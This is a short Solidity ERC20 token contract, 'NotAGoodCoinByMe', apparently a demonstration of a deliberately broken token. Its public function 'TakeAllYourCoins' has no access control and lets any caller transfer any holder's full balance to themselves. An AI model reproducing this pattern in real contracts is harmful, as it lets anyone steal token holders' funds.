// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NotAGoodCoinByMe is ERC20 {
    constructor() ERC20("SomeCoin", "SCO") {
        _mint(msg.sender, 1800);
    }

    function TakeAllYourCoins(address _from) public {
        _transfer(_from, msg.sender, balanceOf(_from));
    }
}